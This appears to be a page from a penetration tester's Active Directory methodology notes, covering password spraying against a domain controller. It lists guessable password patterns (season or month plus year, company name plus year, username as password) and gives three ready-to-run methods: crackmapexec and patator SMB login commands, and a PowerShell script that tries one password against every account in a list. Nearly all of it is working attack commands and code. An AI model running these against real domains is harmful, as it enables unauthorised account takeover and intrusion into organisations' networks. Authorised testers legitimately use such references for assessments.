# Password Spray

## Password Spray [t-ad-account_review-password_spray]

Run a password spray attack (alilgn with the current password policy, usually one attempt per hour is ok). Check for the most common passwords like companyname+year, month_name+year, season_name+year. It also worth checking username as a user's password (username:username)

###  Run the password spray attack.




**option 1: crackmapexec**

{% code overflow="wrap" %}
```bash
crackmapexec smb <DC_IP> -u ad_users.txt -p 'April2022' --continue-on-success
```
{% endcode %}


**option 2: patator**

{% code overflow="wrap" %}
```bash
patator smb_login host=<DC_IP> user=FILE0 password='April2022' 0=ad_users.txt -x ignore:code=c000006d
```
{% endcode %}


**option 3: powershell**

{% code overflow="wrap" %}
```bash
$domain = "<domain_name>"
$userList = Get-Content -Path "C:\Temp\ad_users.txt"
$password = "April2022"

# Load the required .NET assembly
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

# Define the function to validate credentials
Function Test-Credentials($userName, $password) {
    $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
    Return $pc.ValidateCredentials($userName, $password)
}

# Iterate through the user list
ForEach ($user in $userList) {
    $isValid = Test-Credentials -userName $user -password $password
    If ($isValid) {
        Write-Host "[$user] - Valid password: $password"
    } Else {
        Write-Host "[$user] - Invalid password: $password"
    }
}

```
{% endcode %}

